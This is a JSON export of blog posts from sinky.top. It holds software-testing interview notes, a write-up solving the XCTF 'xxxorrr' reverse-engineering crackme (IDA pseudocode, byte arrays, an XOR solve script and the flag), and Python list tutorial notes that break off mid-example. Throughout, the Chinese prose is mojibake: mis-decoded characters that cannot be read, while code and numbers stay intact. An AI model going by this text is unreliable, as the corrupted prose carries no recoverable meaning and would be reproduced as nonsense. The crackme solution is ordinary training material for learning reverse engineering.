é™æ€åˆ†æï¼šä¸é€šè¿‡æ‰§è¡Œç¨‹åºè€Œè¿›è¡Œæµ‹è¯•çš„æŠ€æœ¯ï¼Œå…³é”®åŠŸèƒ½æ˜¯æ£€æŸ¥è½¯ä»¶çš„è¡¨ç¤ºå’Œæè¿°æ˜¯å¦ä¸€è‡´ï¼Œæ²¡æœ‰å†²çªæˆ–è€…æ²¡æœ‰æ­§ä¹‰ã€‚ b) åŠ¨æ€åˆ†æï¼šå…¶ä¸»è¦ç‰¹ç‚¹æ˜¯å½“è½¯ä»¶ç³»ç»Ÿåœ¨æ¨¡æ‹Ÿçš„æˆ–çœŸå®çš„ç¯å¢ƒä¸­æ‰§è¡Œä¹‹å‰ã€ä¹‹ä¸­å’Œä¹‹åï¼Œå¯¹è½¯ä»¶ç³»ç»Ÿè¡Œä¸ºçš„åˆ†æã€‚åŠ¨æ€åˆ†æåŒ…å«äº†ç¨‹åºåœ¨å—æ§çš„ç¯å¢ƒä¸‹ä½¿ç”¨ç‰¹å®šçš„æœŸæœ›ç»“æœè¿›è¡Œæ­£å¼çš„è¿è¡Œã€‚å®ƒæ˜¾ç¤ºäº†ä¸€ä¸ªç³»ç»Ÿåœ¨æ£€æŸ¥çŠ¶æ€ä¸‹æ˜¯æ­£ç¡®è¿˜æ˜¯ä¸æ­£ç¡®ã€‚ i.è¯­å¥è¦†ç›–ï¼šé¡¾åæ€ä¹‰å°±æ˜¯é’ˆå¯¹ä»£ç è¯­å¥ï¼Œè®¾è®¡å‡ºæ¥çš„ç”¨ä¾‹è¦ä¿è¯ç¨‹åºä¸­çš„æ¯ä¸€ä¸ªè¯­å¥è‡³å°‘è¢«æ‰§è¡Œä¸€æ¬¡ã€‚ ii. åˆ†æ”¯è¦†ç›–ï¼šä½¿å¾—ç¨‹åºä¸­æ¯ä¸ªåˆ¤æ–­çš„å–çœŸå’Œå–å‡è‡³å°‘ç»å†ä¸€æ¬¡ï¼Œå³åˆ¤æ–­çš„çœŸå‡å‡æ›¾è¢«æ»¡è¶³ã€‚ iii.æ¡ä»¶è¦†ç›–ï¼šè¦æ±‚è®¾è®¡ç”¨ä¾‹æ—¶é’ˆå¯¹åˆ¤æ–­è¯­å¥é‡Œé¢æ¯ä¸ªæ¡ä»¶è¡¨è¾¾å¼true å’Œ falseå„å–å€¼ä¸€æ¬¡ï¼Œä¸è€ƒåˆ¤æ–­è¯­å¥çš„è®¡ç®—ç»“æœï¼ˆä¸è€ƒè™‘ç»„åˆæƒ…å†µï¼‰ã€‚ iv.åˆ¤å®šæ¡ä»¶è¦†ç›–ï¼šè®¾è®¡æµ‹è¯•ç”¨ä¾‹æ—¶ï¼Œä½¿å¾—åˆ¤æ–­è¯­å¥ä¸­æ¯ä¸ªæ¡ä»¶è¡¨è¾¾å¼çš„æ‰€æœ‰å¯èƒ½ç»“æœè‡³å°‘å‡ºç°ä¸€æ¬¡ï¼Œæ¯ä¸ªåˆ¤æ–­è¯­å¥æœ¬èº«æ‰€æœ‰å¯èƒ½ç»“æœä¹Ÿè‡³å°‘å‡ºç°ä¸€æ¬¡ã€‚ v.ç»„åˆè¦†ç›–ï¼šè®¾è®¡æµ‹è¯•ç”¨ä¾‹æ—¶ï¼Œä½¿å¾—æ¯ä¸ªåˆ¤æ–­è¯­å¥ä¸­æ¡ä»¶ç»“æœçš„æ‰€æœ‰å¯èƒ½ç»„åˆè‡³å°‘å‡ºç°ä¸€æ¬¡ã€‚ vi. è·¯å¾„è¦†ç›–ï¼šè®¾è®¡æµ‹è¯•ç”¨ä¾‹æ—¶ï¼Œè¦†ç›–ç¨‹åºä¸­æ‰€æœ‰å¯èƒ½çš„æ‰§è¡Œè·¯å¾„ è¯´å‡ºå‡ ç§åŸºæœ¬çš„æ•°æ®ç»“æ„1ã€é“¾è¡¨ æ˜¯ä¸€ç§ç‰©ç†å­˜å‚¨å•å…ƒä¸Šéè¿ç»­ã€éé¡ºåºçš„å­˜å‚¨ç»“æ„ï¼Œæ•°æ®å…ƒç´ çš„é€»è¾‘é¡ºåºæ˜¯é€šè¿‡é“¾è¡¨ä¸­çš„æŒ‡é’ˆé“¾æ¥æ¬¡åºå®ç°çš„ã€‚ç”±ä¸€ç³»åˆ—èŠ‚ç‚¹ç»„æˆï¼ŒèŠ‚ç‚¹ä¸å¿…åœ¨å†…å­˜ä¸­ç›¸è¿ï¼Œæ¯ä¸ªèŠ‚ç‚¹ç”±æ•°æ®éƒ¨åˆ†Dataå’Œé“¾éƒ¨åˆ†Nextï¼ŒNextæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè¿™æ ·å½“æ·»åŠ æˆ–è€…åˆ é™¤æ—¶ï¼Œåªéœ€è¦æ”¹å˜ç›¸å…³èŠ‚ç‚¹çš„Nextçš„æŒ‡å‘ï¼Œæ•ˆç‡å¾ˆé«˜ã€‚ 2ã€æ ˆå’Œé˜Ÿåˆ— æ˜¯æ¯”è¾ƒç‰¹æ®Šçš„çº¿æ€§è¡¨ï¼Œæ ˆæ˜¯é™åˆ¶æ’å…¥å’Œåˆ é™¤åªèƒ½åœ¨ä¸€ä¸ªä½ç½®ä¸Šè¿›è¡Œçš„è¡¨ï¼Œåè¿›å…ˆå‡ºã€‚ é˜Ÿåˆ—åªå…è®¸åœ¨frontç«¯è¿›è¡Œåˆ é™¤æ“ä½œï¼Œåœ¨rearç«¯è¿›è¡Œæ’å…¥æ“ä½œã€‚ 3ã€æ ‘ æ ‘å½¢ç»“æ„æ˜¯ä¸€ç±»éå¸¸é‡è¦çš„éçº¿æ€§æ•°æ®ç»“æ„ï¼Œè€ƒå¯Ÿä¸»è¦ä»¥äºŒå‰æ ‘ä¸ºä¸» äº†è§£ä»€ä¹ˆæµ‹è¯•æ–¹æ³•ç­‰ä»·ç±»åˆ’åˆ†ï¼Œè¾¹ç•Œå€¼åˆ†æï¼Œé”™è¯¯æ¨æµ‹ï¼Œå› æœå›¾æ³•ï¼Œé€»è¾‘è¦†ç›–æ³•ï¼Œç¨‹åºæ’æ¡©æŠ€æœ¯ï¼ŒåŸºæœ¬è·¯å¾„æ³•ï¼Œç¬¦å·æµ‹è¯•ï¼Œé”™è¯¯é©±åŠ¨æµ‹è¯• è®¾è®¡ä¸€ä¸ªå¾®ä¿¡æœ‹å‹åœˆç‚¹èµçš„æµ‹è¯•ç”¨ä¾‹åŠŸèƒ½æµ‹è¯•ï¼šç‚¹èµæŸæ¡æœ‹å‹åœˆï¼ŒéªŒè¯æ˜¯å¦æˆåŠŸ æ¥å£æµ‹è¯•ï¼šç‚¹èµæœ‹å‹åœˆï¼ŒéªŒè¯æœ‹å‹èƒ½å¦æ”¶åˆ°æç¤ºä¿¡æ¯ æ€§èƒ½æµ‹è¯•ï¼šç‚¹èµæœ‹å‹åœˆï¼Œæ˜¯å¦åœ¨è§„å®šæ—¶é—´æ˜¾ç¤ºç»“æœï¼Œæ˜¯å¦åœ¨è§„å®šæ—¶é—´åœ¨æœ‹å‹æ‰‹æœºä¸Šè¿›è¡Œæç¤º å…¼å®¹æ€§æµ‹è¯•ï¼šåœ¨ä¸åŒçš„ç»ˆç«¯æ‰‹æœºä¸Šç‚¹èµæœ‹å‹åœˆéªŒè¯æ˜¯å¦æˆåŠŸ HTTPæŠ¥æ–‡æ®µæ˜¯ä»€ä¹ˆæ ·çš„httpæŠ¥æ–‡æ˜¯é¢å‘æ–‡æœ¬ï¼Œæ¯ä¸€ä¸ªå­—æ®µéƒ½æ˜¯ASCIIç ä¸²ï¼Œæ¯ä¸ªå­—æ®µé•¿åº¦ä¸ç¡®å®šï¼Œ 1ã€è¯·æ±‚æŠ¥æ–‡ï¼š è¯·æ±‚è¡Œï¼šrequest line,ç”±è¯·æ±‚æ–¹æ³•å­—æ®µã€urlå­—æ®µå’Œhttpåè®®ç‰ˆæœ¬å­—æ®µä¸‰ä¸ªå­—æ®µç»„æˆï¼Œç©ºæ ¼åˆ†éš”ã€‚ è¯·æ±‚æ–¹æ³•ï¼š GET: è¦æ±‚æœåŠ¡å™¨å°†urlå®šä½çš„èµ„æºæ”¾åœ¨å“åº”æŠ¥æ–‡çš„æ•°æ®éƒ¨åˆ†ï¼Œå›é€ç»™å®¢æˆ·ç«¯ï¼Œä¼ å‚é•¿åº¦å—é™åˆ¶ï¼Œè¯·æ±‚æ•°æ®ä»¥åœ°å€å½¢å¼è¡¨ç°åœ¨è¯·æ±‚è¡Œã€‚ POST: å…è®¸å®¢æˆ·ç«¯å‘æœåŠ¡å™¨æä¾›è¾ƒå¤šä¿¡æ¯ï¼Œå°†è¯·æ±‚å‚æ•°å°è£…åœ¨httpè¯·æ±‚æ•°æ®ä¸­ï¼Œä»¥åç§°/å€¼çš„å½¢å¼å‡ºç°ï¼Œå¯ä¼ è¾“å¤§é‡æ•°æ®ï¼Œä¹Ÿä¸ä¼šæ˜¾ç¤ºåœ¨urlä¸­ã€‚ HEAD: æœåŠ¡ç«¯æ¥å—headè¯·æ±‚ååªè¿”å›å“åº”å¤´è€Œä¸ä¼šå‘é€ç›¸åº”å†…å®¹ã€‚ 2ã€URL url: åŒæ„èµ„æºå®šä½ç¬¦ï¼Œæ˜¯ä¸€ç§èµ„æºä½ç½®çš„æŠ½è±¡å”¯ä¸€è¯†åˆ«æ–¹æ³•ï¼Œç”±å­é›†URLå’ŒURNç»„æˆï¼Œ&lt;åè®®&gt;://&lt;ä¸»æœº&gt;:&lt;ç«¯å£&gt;/&lt;è·¯å¾„&gt; 3ã€åè®®ç‰ˆæœ¬ æ ¼å¼ä¸ºHTTP/ä¸»ç‰ˆæœ¬å·.æ¬¡ç‰ˆæœ¬å·ï¼Œå¸¸ç”¨ä¸ºï¼šHTTP/1.1 HTTP/1.0 4ã€è¯·æ±‚å¤´éƒ¨ Host: æ¥å—è¯·æ±‚çš„æœåŠ¡å™¨åœ°å€ï¼ŒIPæˆ–è€…åŸŸå User-Agentï¼šå‘é€è¯·æ±‚çš„åº”ç”¨åç§° Connection: æŒ‡å®šä¸è¿æ¥ç›¸å…³çš„å±æ€§ Accept-Charset: é€šçŸ¥æœåŠ¡å™¨ç«¯å¯ä»¥å‘é€çš„ç¼–ç æ ¼å¼ Accept-Encoding: é€šçŸ¥æœåŠ¡å™¨ç«¯å¯ä»¥å‘é€çš„æ•°æ®å‹ç¼©æ ¼å¼ Accept-Language: é€šçŸ¥æœåŠ¡å™¨ç«¯å¯ä»¥å‘é€çš„è¯­è¨€ è¯·æ±‚è¡Œï¼šåŒ…å«è¯·æ±‚æ–¹å¼ï¼ˆgetã€postã€putç­‰ï¼‰ã€URLï¼ŒHttpåè®®ç‰ˆæœ¬ï¼› è¯·æ±‚å¤´ï¼šåŒ…å«ä¸»æœºhostï¼Œè¯·æ±‚æ—¶é—´ï¼Œå®¢æˆ·ç«¯ç±»å‹ã€æŒ‡å®šå®¢æˆ·ç«¯æ¥æ”¶çš„æ•°æ®æ ¼å¼ï¼Œå®¢æˆ·ç«¯æ”¯æŒçš„è¯­è¨€ç­‰ è¯·æ±‚ä½“ï¼šåŒ…å«postæ–¹æ³•æäº¤çš„æ•°æ®ï¼Œä¹Ÿå¯ä»¥ä¸ºç©ºï¼› å“åº”è¡Œï¼šåŒ…å«çŠ¶æ€ç ã€å“åº”ä¿¡æ¯ã€Httpåè®®ç‰ˆæœ¬ï¼› å“åº”å¤´ï¼šåŒ…å«å“åº”æ—¶é—´ï¼Œå“åº”æ•°æ®çš„é•¿åº¦ã€ç±»å‹ã€å­—ç¬¦ç¼–ç ç­‰ å“åº”ä½“ï¼šåŒ…å«é¡µé¢æºç ï¼› å‹åŠ›æµ‹è¯•å¯¹ç³»ç»Ÿä¸æ–­æ–½åŠ å†Œç«‹ï¼Œé€šè¿‡ç¡®å®šä¸€ä¸ªç³»ç»Ÿçš„ç“¶é¢ˆæˆ–è€…ä¸èƒ½æ¥æ”¶çš„æ€§èƒ½ç‚¹ï¼Œæ¥è·å¾—ç³»ç»Ÿèƒ½æä¾›çš„æœ€å¤§æœåŠ¡çº§åˆ«çš„æµ‹è¯•ã€‚ tcp udp åŒºåˆ«1ã€tcpé¢å‘è¿æ¥ï¼ˆå…ˆå»ºç«‹è¿æ¥å†å‘é€æ•°æ®ï¼‰ udpæ— è¿æ¥ï¼Œå‘é€æ•°æ®é’±ä¸éœ€è¦å»ºç«‹è¿æ¥ 2ã€tcpå®‰å…¨å¯é ï¼Œä¼ é€çš„æ•°æ®æ— å·®é”™ä¸ä¸¢å¤±ä¸é‡å¤ä¸”æŒ‰åºåˆ°è¾¾ï¼› udpå°½æœ€å¤§åŠªåŠ›äº¤ä»˜ï¼Œä½†æ˜¯ä¸ä¿è¯å¯é äº¤ä»˜ 3ã€tcpé¢å‘å­—èŠ‚æµ,æŠŠæ•°æ®çœ‹æˆä¸€è¿ä¸²æ— ç»“æ„çš„å­—èŠ‚æµ; UDPæ˜¯é¢å‘æŠ¥æ–‡çš„ï¼Œåº”ç”¨å±‚äº¤ç»™UDPå¤šé•¿çš„æŠ¥æ–‡ï¼ŒUDPå°±ç…§æ ·å‘é€ï¼Œå³ä¸€æ¬¡å‘é€ä¸€ä¸ªæŠ¥æ–‡ 4ã€æ¯ä¸€æ¡TCPè¿æ¥åªèƒ½æ˜¯ç‚¹åˆ°ç‚¹çš„;UDPæ”¯æŒä¸€å¯¹ä¸€ï¼Œä¸€å¯¹å¤šï¼Œå¤šå¯¹ä¸€å’Œå¤šå¯¹å¤šçš„äº¤äº’é€šä¿¡ 5ã€TCPçš„é€»è¾‘é€šä¿¡ä¿¡é“æ˜¯å…¨åŒå·¥çš„å¯é ä¿¡é“ï¼ŒUDPåˆ™æ˜¯ä¸å¯é ä¿¡é“ ä»‹ç»ä¸€ä¸‹å•å…ƒæµ‹è¯•ã€é›†æˆæµ‹è¯•ã€ç³»ç»Ÿæµ‹è¯•ã€éªŒæ”¶æµ‹è¯•ã€å›å½’æµ‹è¯•1ã€å•å…ƒæµ‹è¯•ï¼š å®Œæˆæœ€å°çš„è½¯ä»¶è®¾è®¡å•å…ƒï¼ˆæ¨¡å—ï¼‰çš„éªŒè¯å·¥ä½œï¼Œç›®æ ‡æ˜¯ç¡®ä¿æ¨¡å—è¢«æ­£ç¡®çš„ç¼–ç ï¼Œä½¿ç”¨è¿‡ç¨‹è®¾è®¡æè¿°ä½œä¸ºæŒ‡å—ï¼Œå¯¹é‡è¦çš„æ§åˆ¶è·¯å¾„è¿›è¡Œæµ‹è¯•ä»¥å‘ç°æ¨¡å—å†…çš„é”™è¯¯ï¼Œé€šå¸¸æƒ…å†µä¸‹æ˜¯ç™½ç›’çš„ï¼Œå¯¹ä»£ç é£æ ¼å’Œè§„åˆ™ã€ç¨‹åºè®¾è®¡å’Œç»“æ„ã€ä¸šåŠ¡é€»è¾‘ç­‰è¿›è¡Œé™æ€æµ‹è¯•ï¼ŒåŠæ—©çš„å‘ç°å’Œè§£å†³ä¸æ˜“æ˜¾ç°çš„é”™è¯¯ã€‚ 2ã€é›†æˆæµ‹è¯•ï¼š é€šè¿‡æµ‹è¯•å‘ç°ä¸æ¨¡å—æ¥å£æœ‰å…³çš„é—®é¢˜ã€‚ç›®æ ‡æ˜¯æŠŠé€šè¿‡äº†å•å…ƒæµ‹è¯•çš„æ¨¡å—æ‹¿æ¥ï¼Œæ„é€ ä¸€ä¸ªåœ¨è®¾è®¡ä¸­æ‰€æè¿°çš„ç¨‹åºç»“æ„ï¼Œåº”å½“é¿å…ä¸€æ¬¡æ€§çš„é›†æˆï¼ˆé™¤éè½¯ä»¶è§„æ¨¡å¾ˆå°ï¼‰ï¼Œè€Œé‡‡ç”¨å¢é‡é›†æˆã€‚ è‡ªé¡¶å‘ä¸‹é›†æˆï¼šæ¨¡å—é›†æˆçš„é¡ºåºæ˜¯é¦–å…ˆé›†æˆä¸»æ¨¡å—ï¼Œç„¶åæŒ‰ç…§æ§åˆ¶å±‚æ¬¡ç»“æ„å‘ä¸‹è¿›è¡Œé›†æˆï¼Œéš¶å±äºä¸»æ¨¡å—çš„æ¨¡å—æŒ‰ç…§æ·±åº¦ä¼˜å…ˆæˆ–å¹¿åº¦ä¼˜å…ˆçš„æ–¹å¼é›†æˆåˆ°æ•´ä¸ªç»“æ„ä¸­å»ã€‚ è‡ªåº•å‘ä¸Šé›†æˆï¼šä»åŸå­æ¨¡å—å¼€å§‹æ¥è¿›è¡Œæ„é€ å’Œæµ‹è¯•ï¼Œå› ä¸ºæ¨¡å—æ˜¯è‡ªåº•å‘ä¸Šé›†æˆçš„ï¼Œè¿›è¡Œæ—¶è¦æ±‚æ‰€æœ‰éš¶å±äºæŸä¸ªç»™é¡¶å±‚æ¬¡çš„æ¨¡å—æ€»æ˜¯å­˜åœ¨çš„ï¼Œä¹Ÿä¸å†æœ‰ä½¿ç”¨ç¨³å®šæµ‹è¯•æ¡©çš„å¿…è¦ã€‚ 3ã€ç³»ç»Ÿæµ‹è¯•ï¼š æ˜¯åŸºäºç³»ç»Ÿæ•´ä½“éœ€æ±‚è¯´æ˜ä¹¦çš„é»‘ç›’ç±»æµ‹è¯•ï¼Œåº”è¦†ç›–ç³»ç»Ÿæ‰€æœ‰è”åˆçš„éƒ¨ä»¶ã€‚ç³»ç»Ÿæµ‹è¯•æ˜¯é’ˆå¯¹æ•´ä¸ªäº§å“ç³»ç»Ÿè¿›è¡Œçš„æµ‹è¯•ï¼Œç›®çš„æ˜¯éªŒè¯ç³»ç»Ÿæ˜¯å¦æ»¡è¶³äº†éœ€æ±‚è§„æ ¼çš„å®šä¹‰ï¼Œæ‰¾å‡ºä¸éœ€æ±‚è§„æ ¼ä¸ç›¸ç¬¦åˆæˆ–ä¸ä¹‹çŸ›ç›¾çš„åœ°æ–¹ã€‚ç³»ç»Ÿæµ‹è¯•çš„å¯¹è±¡ä¸ä»…ä»…åŒ…æ‹¬éœ€è¦æµ‹è¯•çš„äº§å“ç³»ç»Ÿçš„è½¯ä»¶ï¼Œè¿˜è¦åŒ…å«è½¯ä»¶æ‰€ä¾èµ–çš„ç¡¬ä»¶ã€å¤–è®¾ç”šè‡³åŒ…æ‹¬æŸäº›æ•°æ®ã€æŸäº›æ”¯æŒè½¯ä»¶åŠå…¶æ¥å£ç­‰ã€‚å› æ­¤ï¼Œå¿…é¡»å°†ç³»ç»Ÿä¸­çš„è½¯ä»¶ä¸å„ç§ä¾èµ–çš„èµ„æºç»“åˆèµ·æ¥ï¼Œåœ¨ç³»ç»Ÿå®é™…è¿è¡Œç¯å¢ƒä¸‹æ¥è¿›è¡Œæµ‹è¯•ã€‚ 4ã€å›å½’æµ‹è¯•ï¼š å›å½’æµ‹è¯•æ˜¯æŒ‡åœ¨å‘ç”Ÿä¿®æ”¹ä¹‹åé‡æ–°æµ‹è¯•å…ˆå‰çš„æµ‹è¯•ç”¨ä¾‹ä»¥ä¿è¯ä¿®æ”¹çš„æ­£ç¡®æ€§ã€‚ç†è®ºä¸Šï¼Œè½¯ä»¶äº§ç”Ÿæ–°ç‰ˆæœ¬ï¼Œéƒ½éœ€è¦è¿›è¡Œå›å½’æµ‹è¯•ï¼ŒéªŒè¯ä»¥å‰å‘ç°å’Œä¿®å¤çš„é”™è¯¯æ˜¯å¦åœ¨æ–°è½¯ä»¶ç‰ˆæœ¬ä¸Šå†æ¬¡å‡ºç°ã€‚æ ¹æ®ä¿®å¤å¥½äº†çš„ç¼ºé™·å†é‡æ–°è¿›è¡Œæµ‹è¯•ã€‚å›å½’æµ‹è¯•çš„ç›®çš„åœ¨äºéªŒè¯ä»¥å‰å‡ºç°è¿‡ä½†å·²ç»ä¿®å¤å¥½çš„ç¼ºé™·ä¸å†é‡æ–°å‡ºç°ã€‚ä¸€èˆ¬æŒ‡å¯¹æŸå·²çŸ¥ä¿®æ­£çš„ç¼ºé™·å†æ¬¡å›´ç»•å®ƒåŸæ¥å‡ºç°æ—¶çš„æ­¥éª¤é‡æ–°æµ‹è¯•ã€‚ 5ã€éªŒæ”¶æµ‹è¯•ï¼š éªŒæ”¶æµ‹è¯•æ˜¯æŒ‡ç³»ç»Ÿå¼€å‘ç”Ÿå‘½å‘¨æœŸæ–¹æ³•è®ºçš„ä¸€ä¸ªé˜¶æ®µï¼Œè¿™æ—¶ç›¸å…³çš„ç”¨æˆ·æˆ–ç‹¬ç«‹æµ‹è¯•äººå‘˜æ ¹æ®æµ‹è¯•è®¡åˆ’å’Œç»“æœå¯¹ç³»ç»Ÿè¿›è¡Œæµ‹è¯•å’Œæ¥æ”¶ã€‚å®ƒè®©ç³»ç»Ÿç”¨æˆ·å†³å®šæ˜¯å¦æ¥æ”¶ç³»ç»Ÿã€‚å®ƒæ˜¯ä¸€é¡¹ç¡®å®šäº§å“æ˜¯å¦èƒ½å¤Ÿæ»¡è¶³åˆåŒæˆ–ç”¨æˆ·æ‰€è§„å®šéœ€æ±‚çš„æµ‹è¯•ã€‚éªŒæ”¶æµ‹è¯•åŒ…æ‹¬Alphaæµ‹è¯•å’ŒBetaæµ‹è¯•ã€‚ Alphaæµ‹è¯•ï¼šæ˜¯ç”±ç”¨æˆ·åœ¨å¼€å‘è€…çš„åœºæ‰€æ¥è¿›è¡Œçš„ï¼Œåœ¨ä¸€ä¸ªå—æ§çš„ç¯å¢ƒä¸­è¿›è¡Œã€‚ Betaæµ‹è¯•ï¼šç”±è½¯ä»¶çš„æœ€ç»ˆç”¨æˆ·åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªç”¨æˆ·åœºæ‰€æ¥è¿›è¡Œçš„ï¼Œå¼€å‘è€…é€šå¸¸ä¸åœ¨ç°åœºï¼Œç”¨æˆ·è®°å½•æµ‹è¯•ä¸­é‡åˆ°çš„é—®é¢˜å¹¶æŠ¥å‘Šç»™å¼€å‘è€…ï¼Œå¼€å‘è€…å¯¹ç³»ç»Ÿè¿›è¡Œæœ€åçš„ä¿®æ”¹ï¼Œå¹¶å¼€å§‹å‡†å¤‡å‘å¸ƒæœ€ç»ˆçš„è½¯ä»¶ã€‚ tcpçš„ä¸‰æ¬¡æ¡æ‰‹","categories":[],"tags":[{"name":"è½¯ä»¶æµ‹è¯•ï¼Œé¢è¯•å‡†å¤‡","slug":"è½¯ä»¶æµ‹è¯•ï¼Œé¢è¯•å‡†å¤‡","permalink":"https://sinky.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%EF%BC%8C%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"}]},{"title":"æ”»é˜²ä¸–ç•ŒRE-xxxorrr","slug":"æ”»é˜²ä¸–ç•ŒRE-xxxorrr","date":"2022-08-19T03:33:52.263Z","updated":"2022-09-02T14:44:04.932Z","comments":true,"path":"2022/08/19/æ”»é˜²ä¸–ç•ŒRE-xxxorrr/","link":"","permalink":"https://sinky.top/2022/08/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-xxxorrr/","excerpt":"","text":"xor å¼‚æˆ–é€»è¾‘è¿ç®—ï¼šç›¸åŒä¸º0ï¼Œä¸åŒä¸º1 ida64æ‰“å¼€ï¼Œæ‰¾åˆ°å…³é”®å­—ç¬¦ä¸²Congratulations,ç‚¹è¿›å»æŸ¥çœ‹ä¼ªä»£ç  12345678910__int64 sub_916(){ __int64 v1; // [sp+8h] [bp-8h]@1 v1 = *MK_FP(__FS__, 40LL); if ( !strcmp(s1, s2) ) puts(\"Congratulations!\"); else puts(\"Wrong!\"); return *MK_FP(__FS__, 40LL) ^ v1;} s1ä¸s2ç›¸åŒï¼Œè¿”å›Congratulations! æŸ¥çœ‹s1,s2å€¼ï¼š 12s1=qasxcytgsasxcvrefghnrfghnjedfgbhns2= 0x56, 0x4E, 0x57, 0x58, 0x51, 0x51, 0x09, 0x46, 0x17, 0x46, 0x54, 0x5A, 0x59, 0x59, 0x1F, 0x48, 0x32, 0x5B, 0x6B, 0x7C, 0x75, 0x6E, 0x7E, 0x6E, 0x2F, 0x77, 0x4F, 0x7A, 0x71, 0x43, 0x2B, 0x26, 0x89, 0xFE, 0x00 æŸ¥çœ‹mainå‡½æ•°ä¼ªä»£ç ï¼š 12345678910111213141516__int64 __fastcall main(__int64 a1, char **a2, char **a3){ __int64 result; // rax@4 __int64 v4; // rsi@4 signed int i; // [sp+Ch] [bp-34h]@1 char s[40]; // [sp+10h] [bp-30h]@1 __int64 v7; // [sp+38h] [bp-8h]@1 v7 = *MK_FP(__FS__, 40LL); // v7 8å­—èŠ‚ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“å•¥åŠŸèƒ½ sub_A90((__int64)sub_916); fgets(s, 35, stdin); // ä»stdinä¸­è¯»å–35ä¸ªå­˜å‚¨åˆ°s for ( i = 0; i &lt;= 33; ++i ) s1[(signed __int64)i] ^= s[i]; // s1å’Œså¼‚æˆ–ï¼Œå€¼ä¼ ç»™s1 result = 0LL; v4 = *MK_FP(__FS__, 40LL) ^ v7; return result;} ä¸çŸ¥é“è¿™ç©æ„å„¿å•¥æ„æ€ï¼Œçœ‹ä¸€ä¸‹mainæµç¨‹å›¾å§ï¼š s1å’Œs2å¼‚æˆ–ï¼Œç„¶åè·Ÿsæ¯”è¾ƒï¼Œä¸€æ ·å°±Congratulationsï¼Œ é‚£å°±s1å’Œs2å¼‚æˆ–ä¸€ä¸‹å‘—ã€‚ ä½†è¿˜æ˜¯ä¸è¡Œï¼ŒæŸ¥çœ‹äº†ä¸€ä¸‹å®˜æ–¹wp,å‘ç°è¿˜æœ‰å¦ä¸€ä¸ªå¼‚æˆ–ï¼Œæ²¡æ‰¾åˆ°ï¼Œå¾ˆè¿·ï¼Œå…ˆè´´ä¸€ä¸‹å®˜æ–¹expå§ã€‚ exp: 123456789s2=[ 0x56, 0x4E, 0x57, 0x58, 0x51, 0x51, 0x09, 0x46, 0x17, 0x46, 0x54, 0x5A, 0x59, 0x59, 0x1F, 0x48, 0x32, 0x5B, 0x6B, 0x7C, 0x75, 0x6E, 0x7E, 0x6E, 0x2F, 0x77, 0x4F, 0x7A, 0x71, 0x43, 0x2B, 0x26, 0x89, 0xFE, 0x00]s1 = 'qasxcytgsasxcvrefghnrfghnjedfgbhn'print(len(s1))for i in range(len(s1)+1): print(chr(ord(s1[i])^ (2 * i + 65)^s2[i]),end='') # flag{c0n5truct0r5_functi0n_in_41f}","categories":[],"tags":[{"name":"RE","slug":"RE","permalink":"https://sinky.top/tags/RE/"},{"name":"CTF","slug":"CTF","permalink":"https://sinky.top/tags/CTF/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"Pythonå­¦ä¹ 3","slug":"pythonå­¦ä¹ 3","date":"2022-08-18T10:07:24.521Z","updated":"2022-08-18T11:44:46.298Z","comments":true,"path":"2022/08/18/pythonå­¦ä¹ 3/","link":"","permalink":"https://sinky.top/2022/08/18/python%E5%AD%A6%E4%B9%A03/","excerpt":"","text":"åˆ—è¡¨å˜é‡å¯ä»¥å­˜å‚¨ä¸€ä¸ªå…ƒç´ ï¼Œè€Œåˆ—è¡¨æ˜¯å¯ä»¥å­˜å‚¨å¤šä¸ªå…ƒç´ ï¼Œç¨‹åºå¯ä»¥æ–¹ä¾¿çš„å¯¹è¿™äº›æ•°æ®è¿›è¡Œæ•´ä½“æ“ä½œã€‚ ï¼ˆç›¸å½“äºæ•°ç»„ï¼‰ eg: 12345a=10list=['hello','world',98]print(id(list)) # 2957481570240print(type(list)) # &lt;class 'list'&gt;print(list) # ['hello', 'world', 98] åˆ›å»ºåˆ—è¡¨1ã€ä½¿ç”¨ä¸­æ‹¬å·[]ï¼Œè‹±æ–‡é€—å·åˆ†éš”ï¼Œè°ƒç”¨å†…ç½®å‡½æ•°list() 2ã€ç‰¹ç‚¹ï¼š æœ‰åºæ’åº ç´¢å¼•æ˜ å°„å”¯ä¸€ä¸€ä¸ªæ•°æ® å¯å­˜å‚¨é‡å¤æ•°æ® ä»»æ„æ•°æ®ç±»å‹æ··å­˜ æ ¹æ®éœ€è¦åŠ¨æ€åˆ†é…å’Œå›æ”¶å†…å­˜ eg: 123list=['hello','world',98] print(list) # ['hello', 'world', 98]print(list[0],list[-3]) # hello hello åˆ—è¡¨æŸ¥è¯¢è·å–æŒ‡å®šå…ƒç´ ç´¢å¼• index() åˆ—è¡¨ä¸­æœ‰ç›¸åŒå…ƒç´ ï¼Œåªè¿”å›ç¬¬ä¸€ä¸ªå…ƒç´ çš„ç´¢å¼• æŸ¥è¯¢å…ƒç´ ä¸å­˜åœ¨è¿”å›error å¯æŒ‡å®šèŒƒå›´ eg: 1234list=['hello','world',98,'hello']print(list.index('hello')) #0 #print(list.index('hello',1,3)) #'world',98,èŒƒå›´å†…æ— 'hello'ï¼Œè¿”å›errorprint(list.index('hello',1,4)) #3 è·å–åˆ—è¡¨ä¸­çš„å•ä¸ªå…ƒç´  æ­£å‘ï¼Œä»0åˆ°n-1ï¼Œeg:list[0] é€†å‘ï¼Œä»-nåˆ°-1ï¼Œeg:list[-n] ä¸å­˜åœ¨ï¼Œerror 1234list=['hello','world',98,'hello',324]print(list[2]) #98print(list[-3]) #98 #print(list[-8]) #error è·å–åˆ—è¡¨ä¸­çš„å¤šä¸ªå…ƒç´ åˆ—è¡¨å[start:stop:step] eg: 1234567891011list1=[10,20,30,40,50,60,70,80]list2=list1[1:6:1]print(list2) # [20, 30, 40, 50, 60]print(list1[1:6])print(list1[1:6:])print(list1[1:6:2]) # [20, 40, 60]print(list1[:6:2]) # [10, 30, 50] #stepä¸ºè´Ÿæ•°print(list1[::-1]) # [80, 70, 60, 50, 40, 30, 20, 10]print(list1[7::-1]) # [80, 